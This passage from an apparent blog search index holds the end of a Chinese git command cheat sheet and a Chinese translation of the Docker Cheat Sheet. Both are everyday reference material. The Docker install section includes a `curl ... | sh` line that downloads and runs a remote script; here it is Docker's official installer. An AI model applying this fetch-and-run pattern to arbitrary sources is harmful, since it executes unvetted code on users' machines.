列出所有分支   \ngit branch -v   # 查看各个分支最后一个提交对象的信息   \ngit branch --merge      # 查看已经合并到当前分支的分支   \ngit branch --no-merge   # 查看为合并到当前分支的分支   \ngit remote show origin  # 可以查看remote地址，远程分支\n```\n\n### 新建\n\n```shell\ngit branch test # 新建test分支  \ngit branch newBrach 3defc69 # 指定哈希3defc69，新建分支名字为newBrach\ngit checkout -b newBrach origin/master # 取回远程主机的更新以后，在它的基础上创建一个新的分支  \ngit checkout -b newBrach 3defc69 # 以哈希值3defc69，新建 newBrach 分支，并切换到该分支\n```\n\n### 连接\n\n```shell\ngit branch --set-upstream dev origin/dev     # 将本地dev分支与远程dev分支之间建立链接  \ngit branch --set-upstream master origin/next # 手动建立追踪关系  \n```\n\n### 分支切换\n\n```shell\ngit checkout test     # 切换到test分支   \ngit checkout -b test  # 新建+切换到test分支   \ngit checkout -b test dev # 基于dev新建test分支，并切换   \n```\n\n## 远端\n\n```shell\ngit fetch <远程主机名> <分支名>   # fetch取回所有分支（branch）的更新  \ngit fetch origin remotebranch[:localbranch]   #  从远端拉去分支[到本地指定分支]   \ngit merge origin/branch   # 合并远端上指定分支   \ngit pull origin remotebranch:localbranch  #  拉去远端分支到本地分支   \ngit push origin branch    # 将当前分支，推送到远端上指定分支   \ngit push origin localbranch:remotebranch  # 推送本地指定分支，到远端上指定分支   \ngit push origin :remotebranch   # 删除远端指定分支   \ngit checkout -b [--track] test origin/dev # 基于远端dev分支，新建本地test分支[同时设置跟踪]  \n```\n\n## submodule\n\n克隆项目同时克隆submodule\n\n```shell\ngit clone https://github.com/jaywcjlove/handbook.git --depth=1 --recurse-submodules\n```\n\n克隆项目，之后再手动克隆 submodule 子项目\n\n```shell\ngit submodule add --force '仓库地址' '路径'\n# 其中，仓库地址是指子模块仓库地址，路径指将子模块放置在当前工程下的路径。\n# 注意：路径不能以 / 结尾（会造成修改不生效）、不能是现有工程已有的目录（不能順利 Clone）\ngit submodule init # 初始化submodule\ngit submodule update # 更新submodule(必须在根目录执行命令)\ngit submodule update --init --recursive  # 下载的工程带有submodule\n```\n\n当使用`git clone`下来的工程中带有submodule时，初始的时候，submodule的内容并不会自动下载下来的，此时，只需执行如下命令：\n\n```shell\ngit submodule foreach git pull  # submodule 里有其他的 submodule 一次更新\ngit submodule foreach git pull origin master # submodule更新\n\ngit submodule foreach --recursive git submodule init\ngit submodule foreach --recursive git submodule update\n```\n\n## 删除文件\n\n```shell\ngit rm -rf node_modules/\n```\n\n## remote\n\ngit是一个分布式代码管理工具，所以可以支持多个仓库，在git里，服务器上的仓库在本地称之为remote。个人开发时，多源用的可能不多，但多源其实非常有用。  \n\n```shell\ngit remote add origin1 git@github.com:yanhaijing/data.js.git  \ngit remote    # 显示全部源  \ngit remote -v # 显示全部源+详细信息  \ngit remote rename origin1 origin2 # 重命名  \ngit remote rm origin    # 删除  \ngit remote show origin  # 查看指定源的全部信息  \n```\n\n## 标签tag\n\n当开发到一定阶段时，给程序打标签是非常棒的功能。  \n\n```shell\ngit tag -a v0.1 -m 'my version 1.4' # 新建带注释标签   \ngit push origin --tags              # 一次性推送所有分支 \ngit push origin v1.5                # 推送单个tag到orgin源上 \ngit tag -v v1.4.2.1                 # 验证标签，验证已经签署的标签\ngit show v1.5                       # 看到对应的 GPG 签\n\ngit tag        # 列出现有标签   \ngit tag v0gi.1 # 新建标签   \ngit checkout tagname   # 切换到标签       \ngit tag -d v0.1 # 删除标签   \ngit push origin :refs/tags/v0.1 # 删除远程标签   \ngit pull --all # 获取远程所有内容包括tag  \ngit --git-dir='<绝对地址>/.git' describe --tags HEAD # 查看本地版本信息  \n```\n\n## 日志log\n\n```shell\ngit config format.pretty oneline  #显示历史记录时，每个提交的信息只显示一行   \ngit config color.ui true #彩色的 git 输出   \ngit log #查看最近的提交日志   \ngit log --pretty=oneline #单行显示提交日志   \ngit log --graph --pretty=oneline --abbrev-commit   \ngit log -num #显示第几条log（倒数）   \ngit reflog #查看所有分支的所有操作记录   \ngit log --since=1.day #一天内的提交；你可以给出各种时间格式，比如说具体的某一天（“2008-01-15”），或者是多久以前（“2 years 1 day 3 minutes ago”）。   \ngit log --pretty=\"%h - %s\" --author=自己的名字 #查看自己的日志   \ngit log -p -2 #展开两次更新显示每次提交的内容差异   \ngit log --stat #要快速浏览其他协作者提交的更新都作了哪些改动   \ngit log --pretty=format:\"%h - %an, %ar : %s\"#定制要显示的记录格式   \ngit log --pretty=format:'%h : %s' --date-order --graph # 拓扑顺序展示   \ngit log --pretty=format:'%h : %s - %ad' --date=short #日期YYYY-MM-DD显示   \ngit log <last tag> HEAD --pretty=format:%s # 只显示commit   \ngit config --global format.pretty '%h : %s - %ad' --date=short #日期YYYY-MM-DD显示 写入全局配置\n```\n\n|选项 | 说明|选项 | 说明|\n|----|----|----|----|\n|%H  |提交对象（commit）的完整哈希字串 |%ad |作者修订日期（可以用 -date= 选项定制格式）|\n|%h  |提交对象的简短哈希字串 |%ar |作者修订日期，按多久以前的方式显示|\n|%T  |树对象（tree）的完整哈希字串 |%cn |提交者(committer)的名字|\n|%t  |树对象的简短哈希字串 |%ce |提交者的电子邮件地址|\n|%P  |父对象（parent）的完整哈希字串 |%cd |提交日期|\n|%p  |父对象的简短哈希字串 |%cr |提交日期，按多久以前的方式显示|\n|%an |作者（author）的名字 |%s  |提交说明|\n|%ae |作者的电子邮件地址| - | - |\n\n[Pretty Formats](https://git-scm.com/docs/git-log#_pretty_formats)\n\n## 重写历史\n\n```shell\ngit commit --amend    # 改变最近一次提交  \ngit rebase -i HEAD~3  # 修改最近三次的提交说明，或者其中任意一次  \ngit commit --amend    # 保存好了，这些指示很明确地告诉了你该干什么  \ngit rebase --continue # 修改提交说明，退出编辑器。  \n```\n\n```shell\npick f7f3f6d changed my name a bit\npick 310154e updated README formatting and added blame\npick a5f4a0d added cat-file\n```\n\n改成\n\n```\npick 310154e updated README formatting and added blame\npick f7f3f6d changed my name a bit\n```\n\n### 删除仓库\n\n```\ncd ..\nrm -rf repo.git\n```\n\n[Github官方教程](https://help.github.com/articles/changing-author-info/)\n\n## 其它\n\n```shell\ngit help *  # 获取命令的帮助信息  \ngit status  # 获取当前的状态，非常有用，因为git会提示接下来的能做的操作  \n```\n\n\n## 报错问题解决\n\n**1. `git fatal: protocol error: bad line length character: No s`**\n\n解决办法：更换remote地址为 `http/https` 的  \n\n**2. `The requested URL returned error: 403 Forbidden while accessing`**\n\n解决github push错误的办法：\n\n```shell\n#vim 编辑器打开 当前项目中的config文件\nvim .git/config\n\n#修改\n[remote \"origin\"]  \n    url = https://github.com/jaywcjlove/example.git  \n\n#为下面代码\n[remote \"origin\"]  \n    url = https://jaywcjlove@github.com/jaywcjlove/example.git  \n```\n\n**3. git status 显示中文问题**\n\n在查看状态的时候 git status 如果是中文就显示下面的情况\n\n```shell\n\\344\\272\\247\\345\\223\\201\\351\\234\\200\\346\\261\\202\n```\n\n解决这个问题方法是：\n\n```shell\ngit config --global core.quotepath false\n```\n\n## 参考资料\n\n- [Git官网](http://git-scm.com/)\n- [**Github 15分钟学习Git**](https://try.github.io)\n- [Git参考手册](http://gitref.org/zh/index.html)\n- [Git简明手册](http://www.mceiba.com/tool/git-cheat-sheet.html)\n- [Git Magic](http://www-cs-students.stanford.edu/~blynn/gitmagic/intl/zh_cn/)\n- [Git Community Book 中文版](http://gitbook.liuhui998.com/index.html)\n- [Pro Git](http://git-scm.com/book/en/v2)\n- [图解Git](http://marklodato.github.io/visual-git-guide/index-zh-cn.html)\n- [git-简明指南](http://rogerdudler.github.io/git-guide/index.zh.html)\n- [learnGitBranching 在线学习工具](http://pcottle.github.io/learnGitBranching/)\n- [初级教程](http://rogerdudler.github.io/git-guide/index.zh.html) \n- [廖雪峰的Git教程](http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000)\n- [蒋鑫老师将带你入github的大门](http://www.worldhello.net/gotgithub/)\n- [git详解](http://www.open-open.com/lib/view/open1328069609436.html)\n- [oschina教程](http://git.oschina.net/progit/)\n- [How to undo (almost) anything with Git撤销一切，汇总各种回滚撤销的场景，加强学习。](https://github.com/blog/2019-how-to-undo-almost-anything-with-git)\n- [Git 教程 | 菜鸟教程runoob.com](http://www.runoob.com/git/git-tutorial.html)\n- [Git 本地仓库和裸仓库](https://gold.xitu.io/post/5842f9b861ff4b005889ade6)\n- [沉浸式学 Git](http://www.kancloud.cn/kancloud/igit/46710)\n- [Git进阶用法，主要是rebase高级用法](http://way.oschina.io/2016/12/15/notes/GitAdvance/?utm_source=gank.io&utm_medium=email)\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","git"]},{"title":"Docker Cheat Sheet","url":"/tips/docker-cheat-sheet/","content":"\nhttps://github.com/wsargent/docker-cheat-sheet\n\n## 目录\n\n* [为何使用 Docker](#为何使用-docker)\n* [系统环境(Prerequisites)](#系统环境)\n* [安装(Installation)](#安装)\n* [容器(Containers)](#容器container)\n* [镜像(Images)](#镜像images)\n* [网络(Networks)](#网络networks)\n* [仓管中心和仓库(Registry & Repository)](#仓管中心和仓库registry--repository)\n* [Dockerfile](#dockerfile)\n* [层(Layers)](#层layers)\n* [链接(Links)](#链接links)\n* [卷标(Volumes)](#卷标volumes)\n* [暴露端口(Exposing Ports)](#暴露端口exposing-ports)\n* [最佳实践(Best Practices)](#最佳实践)\n* [安全(security)](#安全security)\n* [小贴士(Tips)](#小贴士)\n* [贡献手册(Contributing)](#贡献手册contributing)\n\n<!-- more -->\n\n## 为何使用 Docker\n\n「通过 Docker，开发者可以使用任何语言任何工具创建任何应用。“Dockerized” 的应用是完全可移植的，能在任何地方运行 - 不管是同事的 OS X 和 Windows 笔记本，或是在云端运行的 Ubuntu QA 服务，还是在虚拟机运行的 Red Hat 产品数据中心。\n\nDocker Hub 上有 13000+ 的应用，开发者可以从中选取一个进行快速扩展开发。Docker 跟踪管理变更和依赖关系，让系统管理员能更容易理解开发人员是如何让应用运转起来的。而开发者可以通过 Docker Hub 的共有/私有仓库，构建他们的自动化编译，与其他合作者共享成果。\n\nDocker 帮助开发者更快地构建和发布高质量的应用。」—— [什么是 Docker](https://www.docker.com/what-docker/#copy1)\n\n## 系统环境\n\n我用的是 [Oh My Zsh](https://github.com/robbyrussell/oh-my-zsh) 和 [Docker 插件](https://github.com/robbyrussell/oh-my-zsh/wiki/Plugins#docker)，它可以自动补全 Docker 命令。你的环境可能有所不同。\n\n### Linux\n\nDocker 对于 Linux 内核版本的 [最低要求](https://docs.docker.com/engine/installation/binaries/#check-kernel-dependencies) 为 `3.10.x`。\n\n### MacOS\n\n10.8「Mountain Lion」或更新版本。\n\n### 检查版本\n\n时刻关注你当前正在使用的 Docker 版本是十分重要的，这能够帮助你了解可用的特性。同时，可以让你在查找镜像时选择使用的版本。接下来让我们看看如何操作。\n\n* [`docker version`](https://docs.docker.com/engine/reference/commandline/version/) 查看你正在运行的 Docker 版本。\n\n获取 Docker 服务版本：\n\n```\n$ docker version --format '{{.Server.Version}}'\n\n1.8.0\n```\n\n你也可以输出原始的 JSON 数据：\n\n```\n$ docker version --format '{{json .}}'\n\n{\"Client\":{\"Version\":\"1.8.0\",\"ApiVersion\":\"1.20\",\"GitCommit\":\"f5bae0a\",\"GoVersion\":\"go1.4.2\",\"Os\":\"linux\",\"Arch\":\"am\"}\n```\n\n## 安装\n\n### Linux\n\nDocker 官方提供了快速、易用的安装脚本：\n\n```\ncurl -sSL https://get.docker.com/ | sh\n```\n\n如果你不想执行一个不明不白的 Shell 脚本，那么请看 [安装说明](https://docs.docker.com/engine/installation/linux/)，选择你在用的发行版本。\n\n如果你是一个 Docker 超新手，那么你应当先去看看 [系列教程](https://docs.docker.com/engine/getstarted/)。\n\n### macOS\n\n下载并安装 [Docker Community Edition](https://www.docker.com/community-edition)。如果你在使用 Homebrew-Cask，只需在命令行输入 `brew cask install docker` 即可。下载安装 [Docker Toolbox](https://docs.docker.com/toolbox/overview/) 亦可。[Docker For Mac](https://docs.docker.com/docker-for-mac/) 很赞，但是它的安装过程与 VirtualBox 不太一样。详情请查阅 [比较](https://docs.docker.com/docker-for-mac/docker-toolbox/)。\n\n> **注意**：Docker Toolbox 已经过时。你应当使用 Docker Community Edition，详见 [Docker Toolbox](https://docs.docker.com/toolbox/overview/)\n\n安装好 Docker Community Edition 后，点击 Launchpad 内的 Docker 图标。接着即可启动容器了：\n\n```\ndocker run hello-world\n```\n\n好了，现在你有了一个运行中的 Docker 容器了。\n\n## 容器(Container)\n\n[关于 Docker 进程隔离的基础](http://etherealmind.com/basics-docker-containers-hypervisors-coreos/)。容器 (Container) 之于虚拟机 (Virtual Machine) 就好比线程之于进程。或者你可以把他们想成是「吃了类固醇的 chroots」。\n\n### 生命周期\n\n* [`docker create`](https://docs.docker.com/engine/reference/commandline/create) 创建容器但不启动它。\n* [`docker rename`](https://docs.docker.com/engine/reference/commandline/rename/) 用于重命名容器。\n* [`docker run`](https://docs.docker.com/engine/reference/commandline/run) 一键创建并同时启动该容器。\n* [`docker rm`](https://docs.docker.com/engine/reference/commandline/rm) 删除容器。\n* [`docker update`](https://docs.docker.com/engine/reference/commandline/update/) 调整容器的资源限制。\n\n通常情况下，不使用任何命令行选项启动一个容器，该容器将会立即启动并停止。若需保持其运行，你可以使用 `docker run -td container_id` 命令。选项 `-t` 表示分配一个 pseudo-TTY 会话，`-d` 表示自动将容器与终端分离（也就是说在后台运行容器，并输出容器 ID）。\n\n如果你需要一个临时容器，可使用 `docker run --rm` 会在容器停止之后删除它。\n\n如果你需要映射宿主机 (host) 的目录到 Docker 容器内，可使用 `docker run -v $HOSTDIR:$DOCKERDIR`。详见 [卷标(Volumes)](#卷标volumes) 一节。\n\n如果你想同时删除与容器相关联的卷标，那么在删除容器的时候必须包含 `-v` 选项，像这样 `docker rm -v`。\n\n从 Docker 1.10 起，其内置一套各容器独立的 [日志引擎](https://docs.docker.com/engine/admin/logging/overview/)，每个容器可以独立使用。你可以使用 `docker run --log-driver=syslog` 来自定义日志引擎（例如以上的 `syslog`）。\n\n### 启动和停止\n\n* [`docker start`](https://docs.docker.com/engine/reference/commandline/start) 启动已存在的容器。\n* [`docker stop`](https://docs.docker.com/engine/reference/commandline/stop) 停止运行中的容器。\n* [`docker restart`](https://docs.docker.com/engine/reference/commandline/restart) 重启容器。\n* [`docker pause`](https://docs.docker.com/engine/reference/commandline/pause/) 暂停运行中的容器，将其「冻结」在当前状态。\n* [`docker unpause`](https://docs.docker.com/engine/reference/commandline/unpause/) 结束容器暂停状态。\n* [`docker wait`](https://docs.docker.com/engine/reference/commandline/wait) 阻塞地等待某个运行中的容器直到停止。\n* [`docker kill`](https://docs.docker.com/engine/reference/commandline/kill) 向运行中的容器发送 SIGKILL 指令。\n* [`docker attach`](https://docs.docker.com/engine/reference/commandline/attach) 连接到运行中的容器。\n\n如果你想将容器的端口 (ports) 暴露至宿主机，请见 [暴露端口](#暴露端口exposing-ports) 一节。\n\n关于 Docker 实例崩溃后的重启策略，详见 [本文](http://container42.com/2014/09/30/docker-restart-policies/)。\n\n#### CPU 限制\n\n你可以限制 CPU 资源占用，无论是指定百分比，或是特定核心数。\n\n例如，你可以设置 [`cpu-shares`](https://docs.docker.com/engine/reference/run/#/cpu-share-constraint)。该配置看起来有点奇怪 -- 1024 表示 100% CPU，因此如果你希望容器使用所有 CPU 内核的 50%，应将其设置为 512：\n\n```\ndocker run -ti --c 512 agileek/cpuset-test\n```\n\n更多信息请参阅 <https://goldmann.pl/blog/2014/09/11/resource-management-in-docker/#_cpu>。\n\n通过 [`cpuset-cpus`](https://docs.docker.com/engine/reference/run/#/cpuset-constraint) 可使用特定 CPU 内核。\n\n```\ndocker run -ti --cpuset-cpus=0,4,6 agileek/cpuset-test\n```\n\n请参阅 <https://agileek.github.io/docker/2014/08/06/docker-cpuset/> 获取更多细节以及一些不错的视频。\n\n注意，Docker 在容器内仍然能够 **看到** 全部 CPU -- 它仅仅是不使用全部而已。请参阅 <https://github.com/docker/docker/issues/20770> 获取更多细节。\n\n#### 内存限制\n\n同样，亦可给 Docker 设置 [内存限制](https://docs.docker.com/engine/reference/run/#/user-memory-constraints)：\n\n```\ndocker run -it -m 300M ubuntu:14.04 /bin/bash\n```\n\n#### 能力(Capabilities)\n\nLinux 的 Capability 可以通过使用 `cap-add` 和 `cap-drop` 设置。请参阅 <https://docs.docker.com/engine/reference/run/#/runtime-privilege-and-linux-capabilities> 获取更多细节。这有助于提高安全性。\n\n如需要挂载基于 FUSE 的文件系统，你需要结合 `--cap-add` 和 `--device` 使用：\n\n```\ndocker run --rm -it --cap-add SYS_ADMIN --device /dev/fuse sshfs\n```\n\n授予对某个设备的访问权限：\n\n```\ndocker run -it --device=/dev/ttyUSB0 debian bash\n```\n\n授予对所有设备的访问权限：\n\n```\ndocker run -it --privileged -v /dev/bus/usb:/dev/bus/usb debian bash\n```\n\n有关容器特权的更多信息请参阅 [本文](https://docs.docker.com/engine/reference/run/#/runtime-privilege-and-linux-capabilities)。\n\n### 信息\n\n* [`docker ps`](https://docs.docker.com/engine/reference/commandline/ps) 查看运行中的所有容器。\n* [`docker logs`](https://docs.docker.com/engine/reference/commandline/logs) 从容器中读取日志。（你也可以使用自定义日志驱动，不过在 1.10 中，它只支持 `json-file` 和 `journald`）。\n* [`docker inspect`](https://docs.docker.com/engine/reference/commandline/inspect) 查看某个容器的所有信息（包括 IP 地址）。\n* [`docker events`](https://docs.docker.com/engine/reference/commandline/events) 从容器中获取事件 (events)。\n* [`docker port`](https://docs.docker.com/engine/reference/commandline/port) 查看容器的公开端口。\n* [`docker top`](https://docs.docker.com/engine/reference/commandline/top) 查看容器中活动进程。\n* [`docker stats`](https://docs.docker.com/engine/reference/commandline/stats) 查看容器的资源使用量统计信息。\n* [`docker diff`](https://docs.docker.com/engine/reference/commandline/diff) 查看容器文件系统中存在改动的文件。\n\n`docker ps -a` 将显示所有容器，包括运行中和已停止的。\n\n`docker stats --all` 同样将显示所有容器，默认仅显示运行中的容器。\n\n### 导入 / 导出\n\n* [`docker cp`](https://docs.docker.com/engine/reference/commandline/cp) 在容器和本地文件系统之间复制文件或目录。\n* [`docker export`](https://docs.docker.com/engine/reference/commandline/export) 将容器的文件系统打包为归档文件流 (tarball archive stream) 并输出至标准输出 (STDOUT)。\n\n### 执行命令\n\n* [`docker exec`](https://docs.docker.com/engine/reference/commandline/exec) 在容器内执行命令。\n\n例如，进入正在运行的 `foo` 容器，并连接 (attach) 到一个新的 Shell 进程：`docker exec -it foo /bin/bash`。\n\n## 镜像(Images)\n\n镜像是 [Docker 容器的模板](https://docs.docker.com/engine/understanding-docker/#how-does-a-docker-image-work)。\n\n### 生命周期\n\n* [`docker images`](https://docs.docker.com/engine/reference/commandline/images) 查看所有镜像。\n* [`docker import`](https://docs.docker.com/engine/reference/commandline/import) 从归档文件创建镜像。\n* [`docker build`](https://docs.docker.com/engine/reference/commandline/build) 从 Dockerfile 创建镜像。\n* [`docker commit`](https://docs.docker.com/engine/reference/commandline/commit) 为容器创建镜像，如果容器正在运行则会临时暂停。\n* [`docker rmi`](https://docs.docker.com/engine/reference/commandline/rmi) 删除镜像。\n* [`docker load`](https://docs.docker.com/engine/reference/commandline/load) 从标准输入 (STDIN) 加载归档包 (tar archive) 作为镜像，包括镜像本身和标签 (tags, 0.7 起)。\n* [`docker save`](https://docs.docker.com/engine/reference/commandline/save) 将镜像打包为归档包，并输出至标准输出 (STDOUT)，包括所有的父层、标签和版本 (parent layers, tags, versions, 0.7 起)。\n\n### 其它信息\n\n* [`docker history`](https://docs.docker.com/engine/reference/commandline/history) 查看镜像的历史记录。\n* [`docker tag`](https://docs.docker.com/engine/reference/commandline/tag) 给镜像打标签命名（本地或者仓库均可）。\n\n### 清理\n\n虽然你可以用 `docker rmi` 命令来删除指定的镜像，不过有个名为 [docker-gc](https://github.com/spotify/docker-gc) 的工具，它可以以一种安全的方式，清理掉那些不再被任何容器使用的镜像。Docker 1.13 起，使用 `docker image prune` 亦可删除未使用的镜像。参见 [清理](#清理)。\n\n### 加载 / 保存镜像\n\n从文件中加载镜像：\n```\ndocker load < my_image.tar.gz\n```\n\n保存既有镜像：\n```\ndocker save my_image:my_tag | gzip > my_image.tar.gz\n```\n\n### 导入 / 导出容器\n\n从文件中导入容器镜像：\n```\ncat my_container.tar.gz | docker import - my_image:my_tag\n```\n\n导出既有容器：\n```\ndocker export my_container | gzip > my_container.tar.gz\n```\n\n### 加载已保存的镜像 与 导入已导出为镜像的容器 的不同\n\n通过 `load` 命令来加载镜像，会创建一个新的镜像，并继承原镜像的所有历史。\n通过 `import` 将容器作为镜像导入，也会创建一个新的镜像，但并不包含原镜像的历史，因此会比使用 `load` 方式生成的镜像更小。\n\n## 网络(Networks)\n\nDocker 具备 [网络](https://docs.docker.com/engine/userguide/networking/) 功能。我并不是很了解它，所以这是一个扩展本文的好地方。文档 [使用网络](https://docs.docker.com/engine/userguide/networking/work-with-networks/) 指出，这是一种无需暴露端口即可实现 Docker 容器间通信的好方法。\n\n### 生命周期\n\n* [`docker network create`](https://docs.docker.com/engine/reference/commandline/network_create/)\n* [`docker network rm`](https://docs.docker.com/engine/reference/commandline/network_rm/)\n\n### 其它信息\n\n* [`docker network ls`](https://docs.docker.com/engine/reference/commandline/network_ls/)\n* [`docker network inspect`](https://docs.docker.com/engine/reference/commandline/network_inspect/)\n\n### 建立连接\n\n* [`docker network connect`](https://docs.docker.com/engine/reference/commandline/network_connect/)\n* [`docker network disconnect`](https://docs.docker.com/engine/reference/commandline/network_disconnect/)\n\n你可以 [为容器指定 IP 地址](https://blog.jessfraz.com/post/ips-for-all-the-things/)：\n\n```\n# 使用你自己的子网和网关创建一个桥接网络\ndocker network create --subnet 203.0.113.0/24 --gateway 203.0.113.254 iptastic\n\n# 基于以上创建的网络，运行一个 Nginx 容器并指定 IP\n$ docker run --rm -it --net iptastic --ip 203.0.113.2 nginx\n\n# 在其他地方使用 CURL 访问这个 IP（假设该 IP 为公网）\n$ curl 203.0.113.2\n```\n\n## 仓管中心和仓库(Registry & Repository)\n\n仓库 (repository) 是 *被托管(hosted)* 的已命名镜像 (tagged images) 的集合，这组镜像用于构建容器文件系统。\n\n仓管中心 (registry) 则是 *托管服务(host)* -- 用于存储仓库并提供 HTTP API，以便 [管理仓库的上传和下载](https://docs.docker.com/engine/tutorials/dockerrepos/)。\n\nDocker 官方托管着自己的 [仓管中心](https://hub.docker.com/)，包含着数量众多的仓库。不过话虽如此，这个仓管中心 [并没有很好地验证镜像](https://titanous.com/posts/docker-insecurity)，所以如果你担心安全问题的话，请尽量避免使用它。\n\n* [`docker login`](https://docs.docker.com/engine/reference/commandline/login) 登入仓管中心。\n* [`docker logout`](https://docs.docker.com/engine/reference/commandline/logout) 登出仓管中心。\n* [`docker search`](https://docs.docker.com/engine/reference/commandline/search) 从仓管中心检索镜像。\n* [`docker pull`](https://docs.docker.com/engine/reference/commandline/pull) 从仓管中心拉取镜像到本地。\n* [`docker push`](https://docs.docker.com/engine/reference/commandline/push) 从本地推送镜像到仓管中心。\n\n### 本地仓管中心\n\n你可以使用 [docker distribution](https://github.com/docker/distribution) 项目搭建本地的仓管中心，详情参阅 [本地发布 (local deploy)](https://github.com/docker/docker.github.io/blob/master/registry/deploying.md) 的介绍。\n\n科学上网后，也可以看看 [Google+ Group](https://groups.google.com/a/dockerproject.org/forum/#!forum/distribution)。\n\n## Dockerfile\n\n当你执行 `docker build` 时，Docker 将会根据 [配置文件](https://docs.docker.com/engine/reference/builder/) 启动 Docker 容器。远优于使用 `docker commit`。\n\n以下是一些编写 Dockerfile 的常用编辑器，并链接到适配的语法高亮模块︰\n\n* 如果你在使用 [jEdit](http://jedit.org)，你可以使用我开发的 Dockerfile [语法高亮模块](https://github.com/wsargent/jedit-docker-mode)。\n* [Sublime Text 2](https://packagecontrol.io/packages/Dockerfile%20Syntax%20Highlighting)\n* [Atom](https://atom.io/packages/language-docker)\n* [Vim](https://github.com/ekalinin/Dockerfile.vim)\n* [Emacs](https://github.com/spotify/dockerfile-mode)\n* [TextMate](https://github.com/docker/docker/tree/master/contrib/syntax/textmate)\n* 更多信息请参阅 [Docker 遇上 IDE](https://domeide.github.io/)\n\n### 指令\n\n* [.dockerignore](https://docs.docker.com/engine/reference/builder/#dockerignore-file)\n* [FROM](https://docs.docker.com/engine/reference/builder/#from) 为其他指令设置基础镜像 (Base Image)。\n* [MAINTAINER (deprecated - use LABEL instead)](https://docs.docker.com/engine/reference/builder/#maintainer-deprecated) 为生成的镜像设置作者字段。\n* [RUN](https://docs.docker.com/engine/reference/builder/#run) 在当前镜像的基础上生成一个新层并执行命令。\n* [CMD](https://docs.docker.com/engine/reference/builder/#cmd) 设置容器默认执行命令。\n* [EXPOSE](https://docs.docker.com/engine/reference/builder/#expose) 告知 Docker 容器在运行时所要监听的网络端口。注意：并没有实际上将端口设置为可访问。\n* [ENV](https://docs.docker.com/engine/reference/builder/#env) 设置环境变量。\n* [ADD](https://docs.docker.com/engine/reference/builder/#add) 将文件、目录或远程文件复制到容器中。缓存无效。请尽量用 `COPY` 代替 `ADD`。\n* [COPY](https://docs.docker.com/engine/reference/builder/#copy) 将文件或文件夹复制到容器中。注意：将使用 ROOT 用户复制文件，故无论 USER / WORKDIR 指令如何配置，你都需要手动修改其所有者（`chown`），`ADD` 也是一样。\n* [ENTRYPOINT](https://docs.docker.com/engine/reference/builder/#entrypoint) 将容器设为可执行的。\n* [VOLUME](https://docs.docker.com/engine/reference/builder/#volume) 在容器内部创建挂载点 (mount point) 指向外部挂载的卷标或其他容器。\n* [USER](https://docs.docker.com/engine/reference/builder/#user) 设置随后执行 RUN / CMD / ENTRYPOINT 命令的用户名。\n* [WORKDIR](https://docs.docker.com/engine/reference/builder/#workdir) 设置工作目录 (working directory)。\n* [ARG](https://docs.docker.com/engine/reference/builder/#arg) 定义编译时 (build-time) 变量。\n* [ONBUILD](https://docs.docker.com/engine/reference/builder/#onbuild) 添加触发指令，当该镜像被作为其他镜像的基础镜像时该指令会被触发。\n* [STOPSIGNAL](https://docs.docker.com/engine/reference/builder/#stopsignal) 设置停止容器时，向容器内发送的系统调用信号 (system call signal)。\n* [LABEL](https://docs.docker.com/config/labels-custom-metadata/) 将键值对元数据 (key/value metadata) 应用到镜像、容器或是守护进程。\n\n### 教程\n\n* [Flux7's Dockerfile Tutorial](http://flux7.com/blogs/docker/docker-tutorial-series-part-3-automation-is-the-word-using-dockerfile/)\n\n### 例子\n\n* [Examples](https://docs.docker.com/engine/reference/builder/#dockerfile-examples)\n* [Best practices for writing Dockerfiles](https://docs.docker.com/engine/userguide/eng-image/dockerfile_best-practices/)\n* [Michael Crosby](http://crosbymichael.com/) 还有更多的 [Dockerfiles best practices](http://crosbymichael.com/dockerfile-best-practices.html) / [take 2](http://crosbymichael.com/dockerfile-best-practices-take-2.html)\n* [Building Good Docker Images](http://jonathan.bergknoff.com/journal/building-good-docker-images) / [Building Better Docker Images](http://jonathan.bergknoff.com/journal/building-better-docker-images)\n* [Managing Container Configuration with Metadata](https://speakerdeck.com/garethr/managing-container-configuration-with-metadata)\n\n## 层(Layers)\n\nDocker 的版本化文件系统是基于层的。就像 [Git 的提交或文件变更系统](https://docs.docker.com/engine/userguide/storagedriver/imagesandcontainers/) 一样。\n\n## 链接(Links)\n\n链接 (links) [通过 TCP/IP 端口](https://docs.docker.com/userguide/dockerlinks/) 实现 Docker 容器之间的通讯。[Atlassian](https://blogs.atlassian.com/2013/11/docker-all-the-things-at-atlassian-automation-and-wiring/) 展示了可用的例子。你还可以 [通过主机名 (hostname) 链接](https://docs.docker.com/engine/userguide/networking/default_network/dockerlinks/#/updating-the-etchosts-file)。\n\n在某种意义上来说，该特性已经被 [自定义网络](https://docs.docker.com/network/) 所替代。\n\n注意: 如果你希望容器之间**只**通过链接进行通讯，在启动 Docker 守护进程时，请使用 `-icc=false` 来禁用内部进程通讯。\n\n假设你有一个名为 CONTAINER 的容器（通过 `docker run --name CONTAINER` 指定）并且在 Dockerfile 中，暴露了一个端口:\n\n```\nEXPOSE 1337\n```\n\n然后，我们创建另外一个名为 LINKED 的容器:\n\n```\ndocker run -d --link CONTAINER:ALIAS --name LINKED user/wordpress\n```\n\n然后 CONTAINER 暴露的端口和别名将会以如下的环境变量出现在 LINKED 中:\n\n```\n$ALIAS_PORT_1337_TCP_PORT\n$ALIAS_PORT_1337_TCP_ADDR\n```\n\n那么你便可以通过这种方式来连接它了。\n\n使用 `docker rm --link` 即可删除链接。\n\n通常，Docker 容器（亦可理解为「服务」）之间的链接，是「服务发现」的一个子集。如果你打算在生产中大规模使用 Docker，这将是一个很大的问题。请参阅[The Docker Ecosystem: Service Discovery and Distributed Configuration Stores](https://www.digitalocean.com/community/tutorials/the-docker-ecosystem-service-discovery-and-distributed-configuration-stores) 获取更多信息。\n\n## 卷标(Volumes)\n\nDocker 的卷标 (volumes) 是 [独立的文件系统](https://docs.docker.com/engine/tutorials/dockervolumes/)。它们并非必须连接到特定的容器上。\n\n### 生命周期\n\n* [`docker volume create`](https://docs.docker.com/engine/reference/commandline/volume_create/)\n* [`docker volume rm`](https://docs.docker.com/engine/reference/commandline/volume_rm/)\n\n### 信息\n\n* [`docker volume ls`](https://docs.docker.com/engine/reference/commandline/volume_ls/)\n* [`docker volume inspect`](https://docs.docker.com/engine/reference/commandline/volume_inspect/)\n\n卷标在不能使用链接（只有 TCP/IP）的情况下非常有用。例如，如果你有两个 Docker 实例需要通讯并在文件系统上留下记录。\n\n你可以一次性将其挂载到多个 docker 容器上，通过 `docker run 